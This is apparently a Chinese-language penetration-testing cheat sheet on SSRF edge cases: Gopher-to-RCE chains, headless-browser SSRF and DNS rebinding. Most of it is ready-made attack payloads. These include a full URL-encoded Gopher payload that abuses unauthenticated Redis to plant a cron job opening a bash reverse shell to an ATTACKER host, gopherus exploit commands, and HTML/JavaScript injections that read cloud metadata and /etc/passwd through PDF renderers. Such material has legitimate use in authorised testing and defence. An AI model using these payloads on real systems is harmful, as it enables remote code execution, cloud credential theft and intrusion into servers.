# SSRF — 边角场景 (SCENARIOS)

← 主文件 [ssrf.md](ssrf.md)

> 本文件收录 SSRF 的 **Gopher→RCE 链** / **Headless Browser SSRF** / **DNS 重绑定** 等边角场景。
> 入口识别、协议利用、云元数据矩阵、IP 绕过矩阵等核心流程仍在 [ssrf.md](ssrf.md)。

---

## 1. Gopher → RCE

Gopher 协议允许任意 bytes 发送到目标端口。

### 1.1 Redis 未授权 (6379) → RCE

```
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0A%0A*/60%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/4444%200%3E%261%0A%0A%0A%0A%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$16%0D%0A/var/spool/cron/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$4%0D%0Aroot%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A
```

即: Redis set 一个值, 然后 save 写入 crontab 触发反弹 shell。

### 1.2 生成工具

```bash
# gopherus (Ruby / Python)
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit smtp
python3 gopherus.py --exploit memcached
```

---

## 2. Headless Browser SSRF (PDF 生成/HTML渲染)

wkhtmltopdf / Puppeteer / PhantomJS:

```html
<!-- 若后端把 HTML 转 PDF, 支持 JS: -->
<script>
  var req = new XMLHttpRequest();
  req.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
  req.send();
  document.write(req.responseText);
</script>
```

或:
```html
<iframe src="http://127.0.0.1:6379" width="1000" height="500"></iframe>
<iframe src="file:///etc/passwd"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

**关键**: 生成 PDF 的服务通常运行在云服务器, 能访问元数据服务。

---

## 3. DNS 重绑定 (Rebinding)

### 3.1 原理

服务端做 2 次 DNS 解析:
1. 验证阶段(解析 → 公网 IP, 通过验证)
2. 实际请求阶段(解析 → 127.0.0.1 或内网 IP)

### 3.2 实施

```
# 使用公共 rebinding 服务
http://1.1.1.1.1time.127.0.0.1.repeat.rbndr.us/
http://7f000001.01010101.rbndr.us/
```

或自建: `dnsrebinder` / `dnschef` 等工具。

---

## 4. 相关参考

- 主文件 → [ssrf.md](ssrf.md)
- HTTP 请求走私(可配合 SSRF 打穿前置) → [request-smuggling.md](request-smuggling.md)
- 云安全(元数据服务/IMDSv2) → [../cloud-security.md](../cloud-security.md)
